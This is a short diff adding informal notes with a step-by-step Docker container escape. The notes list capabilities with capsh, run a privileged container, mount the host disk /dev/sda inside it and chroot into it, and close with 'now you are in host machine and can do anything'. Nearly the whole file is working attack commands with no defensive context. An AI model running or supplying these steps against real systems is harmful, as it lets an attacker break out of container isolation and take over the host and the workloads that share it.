@@ -1,0 +1,16 @@
+# below commd will show all container capability
+capsh --print
+
+# To install it in alpine iamge use commd : apk add libcap
+
+step 1:
+# To run container as privilage container use below commd
+docker run -d --privileged image_name:version
+
+step 2: mount /dev/sda(hard disk of host machine) host partition to container /mnt partition
+mount /dev/sda /mnt
+
+Step 3: now use chroot /mnt to change the root partition 
+chroot /mnt bash
+
+now you are in host machine and can do anything 
